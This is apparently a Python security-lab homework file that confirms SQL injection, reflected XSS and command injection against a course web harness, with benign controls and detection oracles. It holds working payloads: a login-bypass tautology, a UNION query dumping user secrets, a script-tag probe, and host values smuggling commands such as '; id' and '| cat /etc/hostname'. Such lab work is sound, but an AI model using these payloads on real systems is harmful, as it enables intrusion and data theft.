import json

from homework.hw2.flores.webharness import (
    login_send,
    ping_send,
    reflect_safe_send,
    reflect_send,
)
from seclab.attack import Finding, Payload, contains_oracle, run_payloads

SQLI_PAYLOADS = [
    Payload(
        "' OR 1=1 -- ",
        intent="tautology, comments out password check",
        family="sqli",
    ),
    Payload("admin' -- ", intent="comment-out", family="sqli"),
    Payload(
        "x' UNION SELECT user, secret FROM users--",
        intent="union-dump",
        family="sqli",
    ),
    Payload("alice", intent="real user, bad password", family="benign"),
]


def confirm_sqli() -> list[Finding]:
    return run_payloads(
        SQLI_PAYLOADS, send=login_send, oracle=contains_oracle("FLAG-sqli-")
    )


def confirm_xss() -> tuple[Finding, Finding]:
    probe = "<script>document.title='seclab-xss-q82k'</script>"

    def tag_survives_oracle(payload, response):
        body = response if isinstance(response, str) else str(response)
        raw_tag_present = "<script>" in body.lower()
        if raw_tag_present:
            return True, "raw <script> tag present verbatim in the HTML"
        return False, "tag was absent or came back HTML-encoded (&lt;script&gt;)"

    p = Payload(probe, intent="unescaped script tag", family="xss")
    vulnerable = run_payloads([p], send=reflect_send, oracle=tag_survives_oracle)[0]
    fixed = run_payloads([p], send=reflect_safe_send, oracle=tag_survives_oracle)[0]
    return vulnerable, fixed


def confirm_cmdi() -> list[Finding]:
    def metachar_reached_oracle(payload, response):
        try:
            data = json.loads(response)
        except (ValueError, TypeError):
            return False, "response was not valid JSON"
        reached = data.get("injection_detected") is True
        return reached, (
            "shell metacharacter reached the command string"
            if reached
            else "host was passed through with no metacharacter"
        )

    payloads = [
        Payload(
            "8.8.8.8; id", intent="semicolon-separated second command", family="cmdi"
        ),
        Payload(
            "8.8.8.8 && uname -a", intent="conditional-chained command", family="cmdi"
        ),
        Payload("8.8.8.8 | cat /etc/hostname", intent="piped command", family="cmdi"),
        # Benign control: a normal, well-formed host with no shell syntax.
        Payload("8.8.8.8", intent="ordinary host, no metacharacters", family="benign"),
    ]
    return run_payloads(payloads, send=ping_send, oracle=metachar_reached_oracle)
